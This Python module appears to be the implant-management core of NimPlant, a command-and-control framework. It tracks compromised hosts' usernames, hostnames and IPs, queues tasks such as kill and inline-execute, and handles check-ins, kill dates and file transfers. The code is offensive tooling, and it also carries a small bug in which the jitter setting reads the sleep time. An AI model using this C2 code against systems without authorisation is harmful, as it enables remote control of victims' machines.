import itertools
import json
import os
import random
import string
from datetime import datetime
from secrets import choice
from typing import List

import server.util.db as db
import server.util.func as func
from server.util.config import config

# Parse configuration from 'config.toml'
try:
    initialSleepTime = config["nimplant"]["sleepTime"]
    initialSleepJitter = config["nimplant"]["sleepTime"]
    killDate = config["nimplant"]["killDate"]
except KeyError as e:
    func.nimplant_print(
        f"ERROR: Could not load configuration, check your 'config.toml': {str(e)}"
    )
    os._exit(1)


class Server:
    def __init__(self):
        self.nimplant_list: List[NimPlant] = []
        self.active_nimplant_guid = None

        self.guid = None
        self.name = None
        self.xor_key = None
        self.killed = False
        self.management_ip = config["server"]["ip"]
        self.management_port = config["server"]["port"]
        self.listener_type = config["listener"]["type"]
        self.listener_ip = config["listener"]["ip"]
        self.listener_host = config["listener"]["hostname"]
        self.listener_port = config["listener"]["port"]
        self.register_path = config["listener"]["registerPath"]
        self.task_path = config["listener"]["taskPath"]
        self.result_path = config["listener"]["resultPath"]
        self.risky_mode = config["nimplant"]["riskyMode"]
        self.sleep_time = config["nimplant"]["sleepTime"]
        self.sleep_jitter = config["nimplant"]["sleepJitter"]
        self.kill_date = config["nimplant"]["killDate"]
        self.user_agent = config["nimplant"]["userAgent"]

    def asdict(self):
        return {
            "guid": self.guid,
            "name": self.name,
            "xorKey": self.xor_key,
            "managementIp": self.management_ip,
            "managementPort": self.management_port,
            "listenerType": self.listener_type,
            "listenerIp": self.listener_ip,
            "listenerHost": self.listener_host,
            "listenerPort": self.listener_port,
            "registerPath": self.register_path,
            "taskPath": self.task_path,
            "resultPath": self.result_path,
            "riskyMode": self.risky_mode,
            "sleepTime": self.sleep_time,
            "sleepJitter": self.sleep_jitter,
            "killDate": self.kill_date,
            "userAgent": self.user_agent,
            "killed": self.killed,
        }

    def initialize(self, name, xor_key):
        self.guid = "".join(
            random.choice(string.ascii_letters + string.digits) for i in range(8)
        )
        self.xor_key = xor_key

        if not name == "":
            self.name = name
        else:
            self.name = self.guid

    def restore_from_db(self):
        previous_server = db.db_get_previous_server_config()

        self.guid = previous_server["guid"]
        self.xor_key = previous_server["xorKey"]
        self.name = previous_server["name"]

        previous_nimplants = db.db_get_previous_nimplants(self.guid)
        for previous_nimplant in previous_nimplants:
            np = NimPlant()
            np.restore_from_database(previous_nimplant)
            self.add(np)

    def add(self, np):
        self.nimplant_list.append(np)

    def select_nimplant(self, nimplant_id):
        if len(nimplant_id) == 8:
            # Select by GUID
            res = [np for np in self.nimplant_list if np.guid == nimplant_id]
        else:
            # Select by sequential ID
            res = [np for np in self.nimplant_list if np.id == nimplant_id]

        if res and res[0].active:
            func.nimplant_print(f"Starting interaction with NimPlant #{res[0].id}.")
            self.active_nimplant_guid = res[0].guid
        else:
            func.nimplant_print("Invalid NimPlant ID.")

    def get_next_active_nimplant(self):
        guid = [np for np in self.nimplant_list if np.active][0].guid
        self.select_nimplant(guid)

    def get_active_nimplant(self):
        res = [np for np in self.nimplant_list if np.guid == self.active_nimplant_guid]
        if res:
            return res[0]
        else:
            return None

    def get_nimplant_by_guid(self, guid):
        res = [np for np in self.nimplant_list if np.guid == guid]
        if res:
            return res[0]
        else:
            return None

    def has_active_nimplants(self):
        for np in self.nimplant_list:
            if np.active and not np.late:
                return True
        return False

    def is_active_nimplant_selected(self):
        if self.active_nimplant_guid is not None:
            return self.get_active_nimplant().active
        else:
            return False

    def kill(self):
        db.kill_server_in_db(self.guid)

    def kill_all_nimplants(self):
        for np in self.nimplant_list:
            np.kill()

    def get_nimplant_info(self, include_all=False):
        result = "\n"
        result += "{:<4} {:<8} {:<15} {:<15} {:<15} {:<15} {:<20} {:<20}\n".format(
            "ID",
            "GUID",
            "EXTERNAL IP",
            "INTERNAL IP",
            "USERNAME",
            "HOSTNAME",
            "PID",
            "LAST CHECK-IN",
        )
        for np in self.nimplant_list:
            if include_all or np.active:
                result += (
                    "{:<4} {:<8} {:<15} {:<15} {:<15} {:<15} {:<20} {:<20}\n".format(
                        np.id,
                        np.guid,
                        np.ip_external,
                        np.ip_internal,
                        np.username,
                        np.hostname,
                        f"{np.pname} ({np.pid})",
                        f"{np.last_checkin} ({np.get_last_checkin_seconds()}s ago)",
                    )
                )

        return result.rstrip()

    def check_late_nimplants(self):
        for np in self.nimplant_list:
            np.is_late()


# Class to contain data and status about connected implant
class NimPlant:
    newId = itertools.count(start=1)

    def __init__(self):
        self.id = str(next(self.newId))
        self.guid = "".join(
            random.choice(string.ascii_letters + string.digits) for i in range(8)
        )
        self.active = False
        self.late = False
        self.ip_external = None
        self.ip_internal = None
        self.username = None
        self.hostname = None
        self.os_build = None
        self.pid = None
        self.pname = None
        self.risky_mode = None
        self.sleep_time = initialSleepTime
        self.sleep_jitter = initialSleepJitter
        self.kill_date = killDate
        self.first_checkin = None
        self.last_checkin = None
        self.pending_tasks: List[str] = []
        self.hosting_file = None
        self.receiving_file = None

        # Generate random, 16-char key for crypto operations
        self.encryption_key = "".join(
            choice(string.ascii_letters + string.digits) for x in range(16)
        )

    def activate(
        self,
        ip_external,
        ip_internal,
        username,
        hostname,
        os_build,
        pid,
        pname,
        risky_mode,
    ):
        self.active = True
        self.ip_external = ip_external
        self.ip_internal = ip_internal
        self.username = username
        self.hostname = hostname
        self.os_build = os_build
        self.pid = pid
        self.pname = pname
        self.risky_mode = risky_mode
        self.first_checkin = func.timestamp()
        self.last_checkin = func.timestamp()

        func.nimplant_print(
            f"NimPlant #{self.id} ({self.guid}) checked in from {username}@{hostname} at '{ip_external}'!\n"
            f"OS version is {os_build}."
        )

        # Create new Nimplant object in the database
        db.db_initialize_nimplant(self, np_server.guid)

    def restore_from_database(self, db_nimplant):
        self.id = db_nimplant["id"]
        self.guid = db_nimplant["guid"]
        self.active = db_nimplant["active"]
        self.late = db_nimplant["late"]
        self.ip_external = db_nimplant["ipAddrExt"]
        self.ip_internal = db_nimplant["ipAddrInt"]
        self.username = db_nimplant["username"]
        self.hostname = db_nimplant["hostname"]
        self.os_build = db_nimplant["osBuild"]
        self.pid = db_nimplant["pid"]
        self.pname = db_nimplant["pname"]
        self.risky_mode = db_nimplant["riskyMode"]
        self.sleep_time = db_nimplant["sleepTime"]
        self.sleep_jitter = db_nimplant["sleepJitter"]
        self.kill_date = db_nimplant["killDate"]
        self.first_checkin = db_nimplant["firstCheckin"]
        self.last_checkin = db_nimplant["lastCheckin"]
        self.hosting_file = db_nimplant["hostingFile"]
        self.receiving_file = db_nimplant["receivingFile"]
        self.encryption_key = db_nimplant["cryptKey"]

    def checkin(self):
        self.last_checkin = func.timestamp()
        self.late = False
        if self.pending_tasks:
            for t in self.pending_tasks:
                task = json.loads(t)
                if task.get("command") == "kill":
                    self.active = False
                    func.nimplant_print(
                        f"NimPlant #{self.id} killed.",
                        self.guid,
                        task_guid=task.get("guid"),
                    )

        db.db_update_nimplant(self)

    def get_last_checkin_seconds(self):
        if self.last_checkin is None:
            return None
        last_checkin_datetime = datetime.strptime(
            self.last_checkin, func.TIMESTAMP_FORMAT
        )
        now_datetime = datetime.now()
        return (now_datetime - last_checkin_datetime).seconds

    def is_active(self):
        if not self.active:
            return False
        return self.active

    def is_late(self):
        # Check if the check-in is taking longer than the maximum expected time (with a 10s margin)
        if not self.active:
            return False

        if self.get_last_checkin_seconds() > (
            self.sleep_time + (self.sleep_time * (self.sleep_jitter / 100)) + 10
        ):
            if self.late:
                return True

            self.late = True
            func.nimplant_print("NimPlant is late...", self.guid)
            db.db_update_nimplant(self)
            return True
        else:
            self.late = False
            return False

    def kill(self):
        self.add_task(["kill"])

    def get_info_pretty(self):
        return func.pretty_print(vars(self))

    def get_next_task(self):
        task = self.pending_tasks[0]
        self.pending_tasks.remove(task)
        return task

    def add_task(self, task, task_friendly=None):
        # Log the 'friendly' command separately, for use with B64-driven commands such as inline-execute
        if task_friendly is None:
            task_friendly = " ".join(task)

        command = task[0]
        args = task[1:] if len(task) > 1 else []
        task = " ".join(task)

        guid = "".join(
            random.choice(string.ascii_letters + string.digits) for i in range(8)
        )
        self.pending_tasks.append(
            json.dumps({"guid": guid, "command": command, "args": args})
        )
        db.db_nimplant_log(self, task_guid=guid, task=task, task_friendly=task_friendly)
        db.db_update_nimplant(self)
        return guid

    def set_task_result(self, task_guid, result):
        if result == "NIMPLANT_KILL_TIMER_EXPIRED":
            # Process NimPlant self destruct
            self.active = False
            func.nimplant_print(
                "NimPlant announced self-destruct (kill date passed). RIP.", self.guid
            )
        else:
            # Parse new sleep time if changed
            if result.startswith("Sleep time changed"):
                rsplit = result.split(" ")
                self.sleep_time = int(rsplit[4])
                self.sleep_jitter = int(rsplit[6].split("%")[0][1:])

            # Process result
            func.nimplant_print(result, self.guid, task_guid=task_guid)

        db.db_update_nimplant(self)

    def cancel_all_tasks(self):
        self.pending_tasks = []
        db.db_update_nimplant(self)

    def host_file(self, file):
        self.hosting_file = file
        db.db_update_nimplant(self)

    def stop_hosting_file(self):
        self.hosting_file = None
        db.db_update_nimplant(self)

    def receive_file(self, file):
        self.receiving_file = file
        db.db_update_nimplant(self)

    def stop_receiving_file(self):
        self.receiving_file = None
        db.db_update_nimplant(self)


# Initialize global class to keep nimplant objects in
np_server = Server()
